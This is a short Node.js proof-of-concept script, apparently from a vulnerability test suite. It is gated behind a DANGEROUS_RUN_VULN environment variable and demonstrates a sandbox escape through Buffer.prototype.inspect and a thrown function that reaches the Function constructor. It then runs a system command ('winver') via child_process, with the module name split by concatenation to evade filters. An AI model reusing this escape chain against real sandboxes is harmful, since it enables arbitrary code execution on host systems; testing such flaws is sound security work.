if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message === "e is not a function" ||
		error.message === "undefined is not a function"
	) {
		process.exit(82);
	}

	process.exit(1);
});

(function () {
	try {
		require("child_" + "process").execSync("idea");
	} catch (e) {} // Not getting executed

	let buffer = {
		hexSlice: () => "",
		magic: {
			get [Symbol.for("nodejs.util.inspect.custom")]() {
				throw (f) => f.constructor("return process")();
			},
		},
	};
	try {
		Buffer.prototype.inspect.call(buffer, 0, { customInspect: true });
	} catch (e) {
		e(() => 0)
			.mainModule.require("child_" + "process")
			.execSync("winver"); // Actually opens winver
	}
})();
